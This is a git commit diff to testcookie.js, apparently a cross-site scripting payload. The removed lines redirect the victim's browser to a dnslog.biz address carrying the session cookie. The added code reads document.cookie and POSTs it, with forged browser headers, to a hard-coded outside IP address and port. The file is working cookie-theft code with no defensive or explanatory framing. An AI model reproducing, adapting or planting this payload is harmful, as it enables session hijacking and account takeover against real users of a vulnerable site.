43af7c50d3c4e4c525de054af945540ff67aa490
zer0p0int <81251950+zer0p0intvvv@users.noreply.github.com>
2024-05-06 15:14:42 +0800

    Update testcookie.js

--- testcookie.js
+++ testcookie.js
@@ -1,3 +1,16 @@
-<meta http-equiv="refresh" content="1; http://9456f69f.dnslog.biz>
 var sessionid = document.cookie.split('=')[1]+".";
-document.location = "https://9456f69f.dnslog.biz/?" + sessionid;
+
+fetch('http://39.101.137.200:7745/send', {
+  method: 'POST',
+  body: 'header=fdsafdsa&listener=admin123321&content='+sessionid,
+  headers: {
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+    'Accept-Encoding': 'gzip, deflate',
+    'Content-Type': 'application/x-www-form-urlencoded',
+  }
+})
+.then(response => response.text())
+.then(data => console.log(data))
+.catch(error => console.error(error));
